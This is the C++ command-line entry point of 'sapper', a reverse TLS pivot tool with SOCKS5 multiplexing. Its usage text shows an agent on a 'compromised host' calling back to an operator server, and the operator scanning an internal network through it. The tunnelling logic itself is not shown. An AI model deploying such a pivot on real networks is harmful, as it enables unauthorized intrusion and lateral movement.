// SPDX-License-Identifier: MIT
// sapper - reverse TLS pivot with SOCKS5 multiplexing
// Command-line entry point.

#include <unistd.h>

#include <iostream>
#include <string>

#include "agent.hpp"
#include "server.hpp"

namespace {

constexpr const char* kVersion = "0.1.0";

const char* kBanner = R"(
   ___
  / __| __ _  _ __  _ __  ___  _ _
  \__ \/ _` || '_ \| '_ \/ -_)| '_|
  |___/\__,_|| .__/| .__/\___||_|
             |_|   |_|      d3xm0s
)";

void usage(const char* prog) {
    std::cout <<
        "sapper " << kVersion << " - reverse TLS pivot with SOCKS5 multiplexing\n\n"
        "Usage:\n"
        "  " << prog << " server [options]     operator side\n"
        "  " << prog << " agent <host:port> [options]   compromised host side\n\n"
        "Server options:\n"
        "  --bind A:PORT     listen for agents (default: 0.0.0.0:8443)\n"
        "  --socks A:PORT    SOCKS5 frontend for your tools (default: 127.0.0.1:1080)\n"
        "  --key PSK         shared secret (required)\n\n"
        "Agent options:\n"
        "  --key PSK         shared secret (required)\n"
        "  --pin HEX         pin the server certificate SHA-256 fingerprint\n\n"
        "Example:\n"
        "  operator:  sapper server --key s3cret\n"
        "  target:    sapper agent 203.0.113.10:8443 --key s3cret\n"
        "  operator:  proxychains -q nmap 10.10.0.0/24   # via socks 127.0.0.1:1080\n";
}

}  // namespace

int main(int argc, char** argv) {
    if (argc < 2) {
        usage(argv[0]);
        return 2;
    }

    std::string mode = argv[1];
    std::string bind = "0.0.0.0:8443";
    std::string socks = "127.0.0.1:1080";
    std::string key;
    std::string pin;
    std::string agent_addr;

    for (int i = 2; i < argc; ++i) {
        std::string a = argv[i];
        auto next = [&](const char* name) -> std::string {
            if (i + 1 >= argc) {
                std::cerr << "error: " << name << " requires a value\n";
                std::exit(2);
            }
            return argv[++i];
        };
        if (a == "--bind") {
            bind = next("--bind");
        } else if (a == "--socks") {
            socks = next("--socks");
        } else if (a == "--key") {
            key = next("--key");
        } else if (a == "--pin") {
            pin = next("--pin");
        } else if (a == "-h" || a == "--help") {
            usage(argv[0]);
            return 0;
        } else if (a == "-v" || a == "--version") {
            std::cout << "sapper " << kVersion << "\n";
            return 0;
        } else if (!a.empty() && a[0] == '-') {
            std::cerr << "error: unknown option " << a << "\n";
            return 2;
        } else {
            agent_addr = a;
        }
    }

    bool color = isatty(STDERR_FILENO);
    std::cerr << (color ? "\033[1m\033[91m" : "") << kBanner
              << (color ? "\033[0m" : "");

    if (key.empty()) {
        std::cerr << "[!] --key is required\n";
        return 2;
    }

    if (mode == "server") {
        return sapper::run_server(bind, socks, key);
    }
    if (mode == "agent") {
        if (agent_addr.empty()) {
            std::cerr << "[!] agent needs the server address: sapper agent host:port --key ...\n";
            return 2;
        }
        return sapper::run_agent(agent_addr, key, pin);
    }

    std::cerr << "[!] unknown mode " << mode << " (server|agent)\n";
    return 2;
}
